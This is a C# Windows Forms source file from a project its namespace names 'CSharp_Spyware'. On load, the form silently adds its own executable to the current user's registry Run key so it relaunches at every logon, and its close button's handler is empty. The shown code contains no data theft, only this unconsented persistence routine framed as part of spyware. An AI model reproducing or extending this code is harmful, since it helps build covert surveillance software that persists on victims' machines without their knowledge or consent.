using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CSharp_Spyware
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void close_btn_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            AddToStartup();
        }

        void AddToStartup()
        {
            try
            {
                string folder = Directory.GetCurrentDirectory();
                string name = Process.GetCurrentProcess().ProcessName;
                string appName = name;
                string appPath = Path.Combine(folder, name + ".exe");

                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                if (key != null)
                {
                    key.SetValue(appName, appPath);
                    key.Close();
                    Console.WriteLine("Application added to startup.");
                }
                else
                {
                    Console.WriteLine("Error: Unable to access the registry key.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }
    }
}
